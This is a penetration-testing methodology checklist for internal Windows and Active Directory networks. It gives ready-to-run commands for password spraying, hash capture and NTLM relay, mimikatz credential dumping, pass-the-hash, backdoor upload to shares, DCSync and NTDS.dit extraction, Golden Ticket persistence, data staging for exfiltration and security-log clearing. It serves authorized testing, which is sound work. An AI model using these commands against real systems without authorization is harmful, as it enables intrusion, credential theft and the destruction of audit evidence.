# Internal Network Penetration Testing Methodology Checklist

> This checklist provides a streamlined methodology for conducting internal network penetration tests, following a practical order of operations from initial information gathering through domain compromise. Each section includes essential commands and key indicators to look for.

## ðŸ“Œ 1. Initial Reconnaissance

### Host Information Gathering
- [ ] Identify current network configuration
  ```
  ipconfig /all                # Windows
  ifconfig -a                  # Linux
  ip addr show                 # Modern Linux
  ```
  - Look for IP address, subnet mask, default gateway
  - Identify network segments (e.g., 192.168.1.0/24)

- [ ] Check current user context and privileges
  ```
  whoami                       # Current username
  whoami /priv                 # Current privileges (Windows)
  whoami /groups               # Group memberships (Windows)
  id                           # User and group info (Linux)
  ```

- [ ] Gather system information
  ```
  systeminfo                   # Windows system info
  hostname                     # Computer name
  uname -a                     # Linux system info
  ```

- [ ] Examine network routing table
  ```
  netstat -rn                  # Shows routing table (all OS)
  route print                  # Windows route table
  ```
  - Identifies default gateways and additional network segments

- [ ] Check active connections
  ```
  netstat -ano                 # Windows active connections
  ss -tuln                     # Linux active connections
  ```
  - Look for internal IPs already communicating with this host

- [ ] Check for multiple network interfaces or VPN connections
  ```
  Get-NetIPConfiguration       # PowerShell - all interfaces
  Get-NetRoute -AddressFamily IPv4 # Check route table for VPN subnets
  ```

## ðŸ“Œ 2. Network Discovery & Mapping

### Finding Live Hosts
- [ ] Perform ping sweep to identify active hosts
  ```
  1..254 | ForEach-Object {ping -n 1 192.168.1.$_ | Select-String "Reply"}  # PowerShell
  nmap -sn 192.168.1.0/24      # Nmap ping scan
  ```

- [ ] Check ARP cache for active hosts (useful if ICMP is blocked)
  ```
  arp -a                       # Shows IP-to-MAC mappings
  ```

- [ ] Identify key infrastructure
  ```
  nltest /dclist:<domain>      # Find domain controllers
  nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>  # Alternate DC finder
  ```

### Port Scanning
- [ ] Scan for common services across the network
  ```
  nmap -p 445,3389,139,135,88,389,636,53,80,443 --open 192.168.1.0/24
  ```
  - SMB (445), RDP (3389), Kerberos (88), LDAP (389/636), DNS (53), Web (80/443)

- [ ] Scan for vulnerable services
  ```
  nmap -p 21,23,25,110,143,8080,1433,3306 --open 192.168.1.0/24
  ```
  - Unencrypted protocols: FTP (21), Telnet (23), SMTP (25), POP3 (110), IMAP (143)
  - Application servers: Tomcat/JBoss (8080), MSSQL (1433), MySQL (3306)

- [ ] Check for SMB vulnerabilities and signing
  ```
  crackmapexec smb 192.168.1.0/24 --gen-relay-list relayable.txt
  ```
  - Identifies hosts with SMB signing disabled (potential relay targets)

## ðŸ“Œ 3. Credential Gathering & Initial Access

### Password Attacks
- [ ] Enumerate users (if you've identified a domain controller)
  ```
  GetADUsers.py -all -dc-ip 192.168.1.100 domain.local/user:password
  ```

- [ ] Password spraying with common passwords
  ```
  crackmapexec smb 192.168.1.0/24 -u userlist.txt -p "Spring2023!" --continue-on-success
  ```
  - Try username as password: 
  ```
  for user in $(cat users.txt); do crackmapexec smb <target> -u $user -p $user -d domain.local; done
  ```

- [ ] Check for accounts with Kerberos pre-authentication disabled (AS-REP Roasting)
  ```
  GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.100 -format hashcat
  ```

### Network Protocol Attacks
- [ ] Set up Responder to capture hashes
  ```
  responder -I eth0 -wbF
  ```
  - Intercepts LLMNR/NBT-NS/mDNS broadcast name resolution attempts
  - Captures NetNTLM hashes that can be cracked or relayed

- [ ] Set up NTLM Relay attack (if SMB signing is disabled)
  ```
  ntlmrelayx.py -tf relayable.txt -smb2support
  ```
  - Relays captured credentials to other systems for authentication

- [ ] Check for Group Policy Preference passwords in SYSVOL
  ```
  crackmapexec smb 192.168.1.100 -u user -p password -M gpp_password
  ```

## ðŸ“Œ 4. Post-Compromise Enumeration

### Local System Enumeration
- [ ] Check for sensitive files and credentials
  ```
  findstr /si password *.xml *.ini *.txt *.config   # Windows
  grep -r "password" --include="*.xml" --include="*.ini" .   # Linux
  ```

- [ ] Check for logged-in users and sessions
  ```
  query user                   # Shows logged-in users on Windows
  qwinsta                      # Shows RDP sessions
  ```
  - Look for admin accounts currently logged in

- [ ] Dump cached credentials (requires admin privileges)
  ```
  mimikatz.exe
  sekurlsa::logonpasswords
  ```
  - Extracts passwords, NTLM hashes, and Kerberos tickets

### Network Resource Enumeration
- [ ] Enumerate accessible shares
  ```
  crackmapexec smb 192.168.1.0/24 -u user -p password --shares
  net view /all /domain
  ```
  - Look for shares with READ/WRITE access for Everyone or Authenticated Users

- [ ] Find domain accounts with SPNs (Kerberoasting targets)
  ```
  GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.100 -request
  ```
  - Service accounts often have weak passwords and elevated privileges

- [ ] Check domain password policy
  ```
  crackmapexec smb 192.168.1.100 -u user -p password --pass-pol
  ```
  - Useful for tuning password attacks to avoid lockouts

## ðŸ“Œ 5. Lateral Movement

### Moving to Other Systems
- [ ] Use PsExec-like tools for remote execution
  ```
  psexec.py domain/user:password@192.168.1.50
  wmiexec.py domain/user:password@192.168.1.50
  ```

- [ ] Use Pass-the-Hash if you have NTLM hashes
  ```
  wmiexec.py -hashes LM:NTLM domain/user@192.168.1.50
  crackmapexec smb 192.168.1.50 -u user -H NTLM_HASH
  ```

- [ ] Access RDP on remote systems
  ```
  xfreerdp /u:user /p:password /v:192.168.1.50
  ```
  - For restricted admin mode (with hash): `/pth:HASH /v:target /restricted-admin`

- [ ] Upload files to compromised shares
  ```
  copy payload.exe \\192.168.1.50\C$\Temp\
  ```
  - Use to deploy tools or backdoors to accessible systems

## ðŸ“Œ 6. Privilege Escalation

### Local Privilege Escalation
- [ ] Check for exploitable privileges
  ```
  whoami /priv
  ```
  - Look for SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege

- [ ] Use Potato attacks for token impersonation
  ```
  # Based on Windows version:
  JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\temp\out.txt"
  ```

- [ ] Check for unquoted service paths or weak service permissions
  ```
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
  ```

### Domain Privilege Escalation
- [ ] Enumerate domain security misconfigurations
  ```
  bloodhound-python -d domain.local -u user -p password -c All -ns 192.168.1.100
  ```
  - Import data to BloodHound to find attack paths to Domain Admins

- [ ] Check for Kerberoastable accounts
  ```
  GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.100 -request -outputfile kerberoast.txt
  hashcat -m 13100 kerberoast.txt wordlist.txt
  ```

- [ ] Check for exploitable ACLs/DACLs
  ```
  # Use BloodHound for visual analysis
  # Look for WriteDACL, GenericAll permissions 
  ```

- [ ] Check for ADCS vulnerabilities
  ```
  certipy find -u user@domain.local -p password -dc-ip 192.168.1.100
  ```

## ðŸ“Œ 7. Domain Compromise

### Taking Control of Active Directory
- [ ] Perform DCSync attack (requires Domain Admin or similar rights)
  ```
  secretsdump.py domain/user:password@192.168.1.100
  mimikatz # lsadump::dcsync /domain:domain.local /all
  ```
  - Extracts all domain password hashes

- [ ] Extract NTDS.dit from Domain Controller
  ```
  # Create Volume Shadow Copy
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
  
  # Extract hashes
  secretsdump.py -ntds ntds.dit -system system LOCAL
  ```

- [ ] Create Golden Ticket for persistence (if you have the KRBTGT hash)
  ```
  mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
  ```

## ðŸ“Œ 8. Data Collection & Exfiltration

- [ ] Search for sensitive files
  ```
  Get-ChildItem -Path C:\ -Include *.doc,*.pdf,*.xls,*.xlsx,*.docx -File -Recurse -ErrorAction SilentlyContinue
  ```

- [ ] Access email data (if you have Exchange access)
  ```
  Get-Mailbox | Get-MailboxStatistics
  ```

- [ ] Compress data for exfiltration
  ```
  Compress-Archive -Path C:\temp\data -DestinationPath C:\temp\data.zip
  ```

## ðŸ“Œ 9. Cleanup & Documentation

- [ ] Remove uploaded tools and artifacts
  ```
  Remove-Item C:\temp\* -Recurse -Force
  ```

- [ ] Clear logs (if required by engagement scope)
  ```
  wevtutil cl Security   # Clear security log
  ```

- [ ] Document all findings, credentials, and attack paths
  - Include network diagrams
  - List compromised accounts and systems
  - Document attack paths and vulnerabilities
